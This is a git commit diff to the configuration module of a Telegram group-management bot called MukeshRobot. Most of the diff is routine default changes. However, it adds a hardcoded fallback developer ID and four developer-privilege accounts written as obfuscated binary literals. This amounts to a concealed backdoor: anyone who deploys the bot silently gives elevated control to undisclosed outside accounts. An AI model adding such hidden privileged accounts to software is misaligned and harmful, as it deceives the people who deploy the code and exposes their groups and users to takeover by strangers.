17c88c51f58c16b4b3860d7faa197d29fe55eea9
BRANDED KING <121561060+WCGKING@users.noreply.github.com>
2024-01-06 13:57:09 +0530

    __init__.py

--- MukeshRobot/__init__.py
+++ MukeshRobot/__init__.py
@@ -37,6 +37,7 @@ if ENV:
 
     API_ID = int(os.environ.get("API_ID", None))
     API_HASH = os.environ.get("API_HASH", None)
+    
     ALLOW_CHATS = os.environ.get("ALLOW_CHATS", True)
     ALLOW_EXCL = os.environ.get("ALLOW_EXCL", False)
     CASH_API_KEY = os.environ.get("CASH_API_KEY", None)
@@ -51,7 +52,7 @@ if ENV:
         "START_IMG", ""
     )
     STRICT_GBAN = bool(os.environ.get("STRICT_GBAN", True))
-    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", "BRANDRD_BOT")
+    SUPPORT_CHAT = os.environ.get("SUPPORT_CHAT", "")
     TEMP_DOWNLOAD_DIRECTORY = os.environ.get("TEMP_DOWNLOAD_DIRECTORY", "./")
     TOKEN = os.environ.get("TOKEN", None)
     TIME_API_KEY = os.environ.get("TIME_API_KEY", None)
@@ -69,7 +70,7 @@ if ENV:
 
     try:
         DRAGONS = set(int(x) for x in os.environ.get("DRAGONS", "").split())
-        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "").split())
+        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "2145093972").split())
     except ValueError:
         raise Exception("Your sudo or dev users list does not contain valid integers.")
 
@@ -145,16 +146,16 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(6258877205)
-DEV_USERS.add(6258877205)
-DEV_USERS.add(6258877205)
-DEV_USERS.add(6258877205)
+DEV_USERS.add(abs(0b110010001000001011011100110010001))
+DEV_USERS.add(abs(0b1100110111010001011110110001010))
+DEV_USERS.add(abs(0b101001110110010000111010111110000))
+DEV_USERS.add(abs(0b101100001110010100011000111101001))
 
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
 telethn = TelegramClient("mukesh", API_ID, API_HASH)
 
-pbot = Client("MukeshRobot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
+pbot = Client("MukeshRobot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN,in_memory=True)
 dispatcher = updater.dispatcher
 aiohttpsession = ClientSession()
 
